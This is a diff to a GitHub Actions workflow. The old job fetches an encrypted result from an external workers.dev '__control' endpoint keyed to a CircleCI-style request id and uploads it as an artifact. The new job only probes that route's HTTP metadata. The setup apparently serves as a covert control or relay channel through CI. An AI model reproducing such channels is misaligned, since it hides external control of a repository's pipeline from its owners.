@@ -1,4 +1,4 @@
-name: V6 public control result collector
+name: V6 public control route probe
 
 on:
   push:
@@ -11,32 +11,18 @@ permissions:
   contents: read
 
 jobs:
-  collect-result:
+  route-probe:
     runs-on: ubuntu-latest
     timeout-minutes: 3
     steps:
-      - name: Trigger bounded read and collect encrypted result
+      - name: Inspect public control route metadata
         shell: bash
         run: |
           set -euo pipefail
-          umask 077
           endpoint='https://mp-zr-express-pwa.eastcoast22-ec.workers.dev/__control/public-result/circleci-public-v4-20260829-v6job1614'
-          code="$(curl --silent --show-error --location --proto '=https' --tlsv1.2 \
+          curl --silent --show-error --location --proto '=https' --tlsv1.2 \
             --retry 1 --retry-delay 1 \
-            -o /tmp/public-control-result.json \
-            -w '%{http_code}' \
-            "$endpoint")"
-          echo "public_control_http=${code}"
-          if [ "$code" != '200' ]; then
-            cat /tmp/public-control-result.json || true
-            exit 1
-          fi
-          python3 -c 'import json; d=json.load(open("/tmp/public-control-result.json")); assert d.get("version")==1; assert d.get("alg")=="RSA-OAEP-256+A256GCM"; assert d.get("request_id")=="circleci-public-v4-20260829-v6job1614"; print("encrypted_result_ready=true")'
-      - name: Upload encrypted result
-        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
-        with:
-          name: v6-public-control-result
-          path: /tmp/public-control-result.json
-          if-no-files-found: error
-          retention-days: 1
-          compression-level: 0
+            -o /tmp/body.bin \
+            -w 'http=%{http_code}\neffective_url=%{url_effective}\ncontent_type=%{content_type}\nredirects=%{num_redirects}\nbytes=%{size_download}\n' \
+            "$endpoint"
+          rm -f /tmp/body.bin
